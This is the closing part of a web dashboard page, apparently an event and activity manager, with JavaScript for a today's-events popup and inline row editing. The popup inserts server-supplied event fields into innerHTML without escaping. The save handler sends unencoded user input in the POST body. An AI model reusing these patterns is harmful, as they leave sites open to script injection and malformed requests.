//         console.log("Fetched Events:", data); // Debugging: Log events data
//         return data;
//     } catch (error) {
//         console.error("Error fetching events:", error);
//         return [];
//     }
// }

// // Function to show the popup if events exist
// async function showEventPopup() {
//     const events = await fetchEvents(); // Get today's events

//     if (events.length > 0) { // If events exist, show popup
//         let eventContent = `<h2>Today's Events</h2><ul>`;
//         events.forEach(event => {
//             eventContent += `<li><strong>${event.event_name}</strong><br>
//                              ${event.description}<br>
//                              ‚è∞ ${event.start_time} - ${event.end_time}</li>`;
//         });
//         eventContent += `</ul>`;

//         // Open a new popup window
//         const popupWindow = window.open("", "EventPopup", "width=500,height=400,resizable=no");
//         if (!popupWindow) {
//             alert("Popup blocked! Please allow popups for this site.");
//             return;
//         }

//         popupWindow.document.write(`
//             <html>
//             <head>
//                 <title>Today's Events</title>
//                 <style>
//                     body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
//                     ul { list-style: none; padding: 0; }
//                     li { margin-bottom: 10px; font-size: 16px; }
//                     .close-btn { background: red; color: white; padding: 5px 10px; border: none; cursor: pointer; margin-top: 10px; }
//                 </style>
//             </head>
//             <body>
//                 ${eventContent}
//                 <button class="close-btn" onclick="window.close()">Close</button>
//             </body>
//             </html>
//         `);
//     } else {
//         console.log("No ongoing events found. No popup will open.");
//     }
// }

// // Run when the page loads
// window.onload = showEventPopup;





window.addEventListener("load", async function () {
    try {
        const response = await fetch("get_today_events.php");
        const events = await response.json();

        if (events.length === 0) return; // No events, no popup

        // Set popup title based on number of events
        const title = `You have ${events.length} event${events.length > 1 ? 's' : ''} today!`;
        document.getElementById("popupTitle").textContent = title;

        // Format the content
        let eventContent = events
            .map(event => `<h2 style="color:black">Event: </h2><strong>${event.event_name}</strong><br><h2 style="color:black">Time: </h2>${event.start_time}<br><h2 style="color:black">Venue: </h2>${event.location}`)
            .join("<hr>");

        document.getElementById("popupContent").innerHTML = eventContent;

        // Show popup and overlay
        document.getElementById("eventPopup").style.display = "block";
        document.getElementById("popupOverlay").style.display = "block";
    } catch (error) {
        console.error("Error fetching events:", error);
    }
});

// Close popup and overlay
document.getElementById("close").addEventListener("click", function () {
    document.getElementById("eventPopup").style.display = "none";
    document.getElementById("popupOverlay").style.display = "none";
});








                     // Toggle between the editable and non-editable views
                     document.querySelectorAll('.edit_btn').forEach(button => {
                        button.addEventListener('click', function() {
                           const rowId = this.getAttribute('data-id');
                           document.querySelector(`#row_${rowId} .start_time_display`).style.display = 'none';
                           document.querySelector(`#row_${rowId} .end_time_display`).style.display = 'none';
                           document.querySelector(`#row_${rowId} .activity_display`).style.display = 'none';
                           document.querySelector(`#row_${rowId} .start_time_input`).style.display = 'inline-block';
                           document.querySelector(`#row_${rowId} .end_time_input`).style.display = 'inline-block';
                           document.querySelector(`#row_${rowId} .activity_input`).style.display = 'inline-block';
                           document.querySelector(`#row_${rowId} .edit_btn`).style.display = 'none';
                           document.querySelector(`#row_${rowId} .save_btn`).style.display = 'inline-block';
                        });
                     });

                     // Save the updated activity data
                     document.querySelectorAll('.save_btn').forEach(button => {
                        button.addEventListener('click', function() {
                           const rowId = this.getAttribute('data-id');
                           const start_time = document.querySelector(`#row_${rowId} .start_time_input`).value;
                           const end_time = document.querySelector(`#row_${rowId} .end_time_input`).value;
                           const activity = document.querySelector(`#row_${rowId} .activity_input`).value;

                           // Send the updated data via AJAX
                           const xhr = new XMLHttpRequest();
                           xhr.open('POST', 'update_activity.php', true);
                           xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                           xhr.onload = function() {
                              if (xhr.status === 200) {
                                 // On success, update the display and hide the input fields
                                 document.querySelector(`#row_${rowId} .start_time_display`).innerText = start_time;
                                 document.querySelector(`#row_${rowId} .end_time_display`).innerText = end_time;
                                 document.querySelector(`#row_${rowId} .activity_display`).innerText = activity;
                                 document.querySelector(`#row_${rowId} .start_time_display`).style.display = 'inline-block';
                                 document.querySelector(`#row_${rowId} .end_time_display`).style.display = 'inline-block';
                                 document.querySelector(`#row_${rowId} .activity_display`).style.display = 'inline-block';
                                 document.querySelector(`#row_${rowId} .start_time_input`).style.display = 'none';
                                 document.querySelector(`#row_${rowId} .end_time_input`).style.display = 'none';
                                 document.querySelector(`#row_${rowId} .activity_input`).style.display = 'none';
                                 document.querySelector(`#row_${rowId} .edit_btn`).style.display = 'inline-block';
                                 document.querySelector(`#row_${rowId} .save_btn`).style.display = 'none';
                              } else {
                                 alert('Error updating activity.');
                              }
                           };
                           xhr.send(`id=${rowId}&start_time=${start_time}&end_time=${end_time}&activity=${activity}`);
                        });
                     });
                  </script>



                  <!-- Display Events -->

                  




                  <!-- footer -->
                  <div class="container-fluid">
                     <div class="footer">
                        <p>&copy; 2025 ADRI India, All rights reserved |  <a style="color:#101F60" href = "developer.php"> Developer contact </a>
                           <!-- Distributed By: <a href="https://themewagon.com/">ThemeWagon</a> -->
                        </p>
                     </div>
                  </div>
               </div>
               <!-- end dashboard inner -->
            </div>
         </div>
      </div>



      
      <!-- jQuery -->
      <script src="js/jquery.min.js"></script>
      <script src="js/popper.min.js"></script>
      <script src="js/bootstrap.min.js"></script>
      <!-- wow animation -->
      <script src="js/animate.js"></script>
      <!-- select country -->
      <script src="js/bootstrap-select.js"></script>
      <!-- owl carousel -->
      <script src="js/owl.carousel.js"></script> 
      <!-- chart js -->
      <script src="js/Chart.min.js"></script>
      <script src="js/Chart.bundle.min.js"></script>
      <script src="js/utils.js"></script>
      <script src="js/analyser.js"></script>
      <!-- nice scrollbar -->
      <script src="js/perfect-scrollbar.min.js"></script>
      <script>
         var ps = new PerfectScrollbar('#sidebar');
      </script>
      <!-- custom js -->
      <script src="js/custom.js"></script>
      <script src="js/chart_custom_style1.js"></script>
   </body>
</html>